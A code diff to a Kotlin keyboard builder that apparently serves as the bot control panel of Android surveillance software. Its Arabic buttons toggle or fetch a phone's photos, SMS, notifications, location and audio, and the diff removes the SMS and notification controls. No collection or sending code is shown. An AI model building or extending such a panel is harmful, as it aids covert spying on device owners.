@@ -5,17 +5,9 @@ import org.json.JSONObject
 
 object KeyboardBuilder {
 
-    // حالة الأزرار (Toggle)
-    @Volatile
-    var photosOn = false
-    @Volatile
-    var smsOn = false
-    @Volatile
-    var notifsOn = false
-    @Volatile
-    var locationOn = false
-    @Volatile
-    var audioOn = false
+    @Volatile var photosOn = false
+    @Volatile var locationOn = false
+    @Volatile var audioOn = false
 
     fun replyKeyboard(): JSONObject {
         val keyboard = JSONArray()
@@ -28,16 +20,6 @@ object KeyboardBuilder {
         keyboard.put(JSONArray().apply {
             put(JSONObject().put("text", if (photosOn) "🔴 إيقاف الصور" else "🟢 تشغيل الصور"))
             put(JSONObject().put("text", "🎵 كل الموسيقى"))
-        })
-
-        keyboard.put(JSONArray().apply {
-            put(JSONObject().put("text", "📩 كل الرسائل"))
-            put(JSONObject().put("text", if (smsOn) "🔴 إيقاف SMS" else "🟢 تشغيل SMS"))
-        })
-
-        keyboard.put(JSONArray().apply {
-            put(JSONObject().put("text", if (notifsOn) "🔴 إيقاف الإشعارات" else "🟢 تشغيل الإشعارات"))
-            put(JSONObject().put("text", "🔔 عرض الإشعارات"))
         })
 
         keyboard.put(JSONArray().apply {
